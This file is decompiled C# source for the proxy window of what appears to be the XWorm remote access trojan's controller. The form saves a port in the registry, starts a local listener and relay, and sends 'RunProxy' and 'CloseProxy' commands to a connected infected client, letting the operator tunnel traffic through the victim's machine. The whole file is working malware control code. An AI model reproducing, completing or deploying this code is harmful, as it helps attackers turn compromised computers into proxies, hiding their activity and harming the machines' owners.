using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.Runtime.CompilerServices;
using System.Threading;
using System.Windows.Forms;
using Guna.UI2.WinForms;
using Microsoft.VisualBasic.CompilerServices;
using XWorm.My;

namespace XWorm
{
	// Token: 0x02000026 RID: 38
	[DesignerGenerated]
	public partial class Proxy : Form
	{
		// Token: 0x06000756 RID: 1878 RVA: 0x00040940 File Offset: 0x0003EB40
		public Proxy()
		{
			base.Load += this.Proxy_Load;
			base.FormClosing += this.Proxy_FormClosing;
			this.InitializeComponent();
		}

		// Token: 0x170002B8 RID: 696
		// (get) Token: 0x06000759 RID: 1881 RVA: 0x00041B4E File Offset: 0x0003FD4E
		// (set) Token: 0x0600075A RID: 1882 RVA: 0x00041B58 File Offset: 0x0003FD58
		internal virtual Label Label6 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x170002B9 RID: 697
		// (get) Token: 0x0600075B RID: 1883 RVA: 0x00041B61 File Offset: 0x0003FD61
		// (set) Token: 0x0600075C RID: 1884 RVA: 0x00041B6B File Offset: 0x0003FD6B
		internal virtual Label Label3 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x170002BA RID: 698
		// (get) Token: 0x0600075D RID: 1885 RVA: 0x00041B74 File Offset: 0x0003FD74
		// (set) Token: 0x0600075E RID: 1886 RVA: 0x00041B7E File Offset: 0x0003FD7E
		internal virtual Label Label2 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x170002BB RID: 699
		// (get) Token: 0x0600075F RID: 1887 RVA: 0x00041B87 File Offset: 0x0003FD87
		// (set) Token: 0x06000760 RID: 1888 RVA: 0x00041B94 File Offset: 0x0003FD94
		internal virtual System.Windows.Forms.Timer Timer1
		{
			[CompilerGenerated]
			get
			{
				return this._Timer1;
			}
			[CompilerGenerated]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.Timer1_Tick);
				System.Windows.Forms.Timer timer = this._Timer1;
				if (timer != null)
				{
					timer.Tick -= value2;
				}
				this._Timer1 = value;
				timer = this._Timer1;
				if (timer != null)
				{
					timer.Tick += value2;
				}
			}
		}

		// Token: 0x170002BC RID: 700
		// (get) Token: 0x06000761 RID: 1889 RVA: 0x00041BD7 File Offset: 0x0003FDD7
		// (set) Token: 0x06000762 RID: 1890 RVA: 0x00041BE1 File Offset: 0x0003FDE1
		internal virtual PictureBox PictureBox1 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x170002BD RID: 701
		// (get) Token: 0x06000763 RID: 1891 RVA: 0x00041BEA File Offset: 0x0003FDEA
		// (set) Token: 0x06000764 RID: 1892 RVA: 0x00041BF4 File Offset: 0x0003FDF4
		internal virtual Label Label1 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x170002BE RID: 702
		// (get) Token: 0x06000765 RID: 1893 RVA: 0x00041BFD File Offset: 0x0003FDFD
		// (set) Token: 0x06000766 RID: 1894 RVA: 0x00041C07 File Offset: 0x0003FE07
		internal virtual Label Label4 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x170002BF RID: 703
		// (get) Token: 0x06000767 RID: 1895 RVA: 0x00041C10 File Offset: 0x0003FE10
		// (set) Token: 0x06000768 RID: 1896 RVA: 0x00041C1A File Offset: 0x0003FE1A
		internal virtual Panel Panel1 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x170002C0 RID: 704
		// (get) Token: 0x06000769 RID: 1897 RVA: 0x00041C23 File Offset: 0x0003FE23
		// (set) Token: 0x0600076A RID: 1898 RVA: 0x00041C2D File Offset: 0x0003FE2D
		internal virtual Panel Panel2 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x170002C1 RID: 705
		// (get) Token: 0x0600076B RID: 1899 RVA: 0x00041C36 File Offset: 0x0003FE36
		// (set) Token: 0x0600076C RID: 1900 RVA: 0x00041C40 File Offset: 0x0003FE40
		internal virtual Guna2TextBox Guna2TextBox4
		{
			[CompilerGenerated]
			get
			{
				return this._Guna2TextBox4;
			}
			[CompilerGenerated]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				KeyEventHandler value2 = new KeyEventHandler(this.Guna2TextBox4_KeyDown);
				Guna2TextBox guna2TextBox = this._Guna2TextBox4;
				if (guna2TextBox != null)
				{
					guna2TextBox.KeyDown -= value2;
				}
				this._Guna2TextBox4 = value;
				guna2TextBox = this._Guna2TextBox4;
				if (guna2TextBox != null)
				{
					guna2TextBox.KeyDown += value2;
				}
			}
		}

		// Token: 0x170002C2 RID: 706
		// (get) Token: 0x0600076D RID: 1901 RVA: 0x00041C83 File Offset: 0x0003FE83
		// (set) Token: 0x0600076E RID: 1902 RVA: 0x00041C90 File Offset: 0x0003FE90
		internal virtual Guna2GradientButton Guna2GradientButton1
		{
			[CompilerGenerated]
			get
			{
				return this._Guna2GradientButton1;
			}
			[CompilerGenerated]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.Guna2GradientButton1_Click);
				Guna2GradientButton guna2GradientButton = this._Guna2GradientButton1;
				if (guna2GradientButton != null)
				{
					guna2GradientButton.Click -= value2;
				}
				this._Guna2GradientButton1 = value;
				guna2GradientButton = this._Guna2GradientButton1;
				if (guna2GradientButton != null)
				{
					guna2GradientButton.Click += value2;
				}
			}
		}

		// Token: 0x170002C3 RID: 707
		// (get) Token: 0x0600076F RID: 1903 RVA: 0x00041CD3 File Offset: 0x0003FED3
		// (set) Token: 0x06000770 RID: 1904 RVA: 0x00041CDD File Offset: 0x0003FEDD
		internal virtual Guna2TextBox Guna2TextBox2 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x170002C4 RID: 708
		// (get) Token: 0x06000771 RID: 1905 RVA: 0x00041CE6 File Offset: 0x0003FEE6
		// (set) Token: 0x06000772 RID: 1906 RVA: 0x00041CF0 File Offset: 0x0003FEF0
		internal virtual Guna2TextBox Guna2TextBox1 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x170002C5 RID: 709
		// (get) Token: 0x06000773 RID: 1907 RVA: 0x00041CF9 File Offset: 0x0003FEF9
		// (set) Token: 0x06000774 RID: 1908 RVA: 0x00041D03 File Offset: 0x0003FF03
		internal virtual Guna2TextBox Guna2TextBox3 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x170002C6 RID: 710
		// (get) Token: 0x06000775 RID: 1909 RVA: 0x00041D0C File Offset: 0x0003FF0C
		// (set) Token: 0x06000776 RID: 1910 RVA: 0x00041D18 File Offset: 0x0003FF18
		internal virtual Guna2GradientButton Guna2GradientButton2
		{
			[CompilerGenerated]
			get
			{
				return this._Guna2GradientButton2;
			}
			[CompilerGenerated]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.Guna2GradientButton2_Click);
				Guna2GradientButton guna2GradientButton = this._Guna2GradientButton2;
				if (guna2GradientButton != null)
				{
					guna2GradientButton.Click -= value2;
				}
				this._Guna2GradientButton2 = value;
				guna2GradientButton = this._Guna2GradientButton2;
				if (guna2GradientButton != null)
				{
					guna2GradientButton.Click += value2;
				}
			}
		}

		// Token: 0x06000777 RID: 1911 RVA: 0x00041D5C File Offset: 0x0003FF5C
		private void Proxy_Load(object sender, EventArgs e)
		{
			try
			{
				bool flag = Conversions.ToBoolean(Operators.NotObject(Operators.CompareObjectEqual(MyProject.Computer.Registry.GetValue(SettingsHelper.RegSave, "ProxyPort", null), null, false)));
				if (flag)
				{
					this.Guna2TextBox4.Text = Conversions.ToString(MyProject.Computer.Registry.GetValue(SettingsHelper.RegSave, "ProxyPort", null));
				}
			}
			catch (Exception ex)
			{
				Debug.WriteLine(ex.Message);
			}
		}

		// Token: 0x06000778 RID: 1912 RVA: 0x00041DF8 File Offset: 0x0003FFF8
		private void Proxy_FormClosing(object sender, FormClosingEventArgs e)
		{
			try
			{
				byte[] state = Helper.SB("CloseProxy");
				Client $VB$NonLocal_2 = this.C;
				ThreadPool.QueueUserWorkItem(delegate(object a0)
				{
					$VB$NonLocal_2.BeginSend((byte[])a0);
				}, state);
				Listener.Close();
				BridgeEndPoint.Close();
				Relay.Close();
			}
			catch (Exception ex)
			{
			}
		}

		// Token: 0x06000779 RID: 1913 RVA: 0x00041E6C File Offset: 0x0004006C
		private void Timer1_Tick(object sender, EventArgs e)
		{
			try
			{
				bool flag = !this.C.IsConnected;
				if (flag)
				{
					base.Close();
				}
			}
			catch (Exception ex)
			{
				Debug.WriteLine(ex.Message);
			}
		}

		// Token: 0x0600077A RID: 1914 RVA: 0x00041EC4 File Offset: 0x000400C4
		private void Guna2GradientButton1_Click(object sender, EventArgs e)
		{
			try
			{
				bool flag = !string.IsNullOrEmpty(this.Guna2TextBox4.Text);
				if (flag)
				{
					bool flag2 = Versioned.IsNumeric(this.Guna2TextBox4.Text);
					if (flag2)
					{
						try
						{
							MyProject.Computer.Registry.SetValue(SettingsHelper.RegSave, "ProxyPort", this.Guna2TextBox4.Text);
						}
						catch (Exception ex)
						{
							Debug.WriteLine(ex.Message);
						}
						this.list_1 = new List<Listener>();
						this.random_0 = new Random();
						Main.list_4 = new List<BridgeEndPoint>();
						Listener listener = new Listener();
						listener.method_0(Conversions.ToInteger(this.Guna2TextBox4.Text), checked(this.list_1.Count - 1), Convert.ToInt32(this.Guna2TextBox4.Text));
						this.list_1.Add(listener);
						int num = 50950;
						string text = this.Cip + ":" + this.Guna2TextBox4.Text;
						this.Guna2TextBox1.Text = this.Cip;
						this.Guna2TextBox2.Text = this.Guna2TextBox4.Text;
						this.Guna2TextBox3.Text = "127.0.0.1:" + Conversions.ToString(num);
						BridgeEndPoint item = new BridgeEndPoint(num, text.Substring(0, text.IndexOf(":")), text);
						Main.list_4.Add(item);
						this.Panel1.Visible = false;
						this.Panel2.Visible = true;
						byte[] state = Helper.SB(string.Concat(new string[]
						{
							"RunProxy",
							SettingsHelper.SPL,
							this.Guna2TextBox4.Text,
							SettingsHelper.SPL,
							this.Cip
						}));
						Client $VB$NonLocal_2 = this.C;
						ThreadPool.QueueUserWorkItem(delegate(object a0)
						{
							$VB$NonLocal_2.BeginSend((byte[])a0);
						}, state);
					}
				}
			}
			catch (Exception ex2)
			{
				MessageBox.Show(ex2.Message);
				base.Close();
			}
		}

		// Token: 0x0600077B RID: 1915 RVA: 0x000247B5 File Offset: 0x000229B5
		private void Guna2GradientButton2_Click(object sender, EventArgs e)
		{
			base.Close();
		}

		// Token: 0x0600077C RID: 1916 RVA: 0x00042128 File Offset: 0x00040328
		private void Guna2TextBox4_KeyDown(object sender, KeyEventArgs e)
		{
			bool flag = e.KeyCode == Keys.Return;
			if (flag)
			{
				e.SuppressKeyPress = true;
				this.Guna2GradientButton1.PerformClick();
			}
		}

		// Token: 0x0400030E RID: 782
		private List<Listener> list_1;

		// Token: 0x0400030F RID: 783
		public static bool bool_1;

		// Token: 0x04000310 RID: 784
		public static bool bool_2;

		// Token: 0x04000311 RID: 785
		private Random random_0;

		// Token: 0x04000312 RID: 786
		public Client C;

		// Token: 0x04000313 RID: 787
		public string Cip;

		// Token: 0x0200014B RID: 331
		private enum Enum0
		{
			// Token: 0x040005CA RID: 1482
			ProcessDPIUnaware,
			// Token: 0x040005CB RID: 1483
			ProcessSystemDPIAware,
			// Token: 0x040005CC RID: 1484
			ProcessPerMonitorDPIAware
		}
	}
}
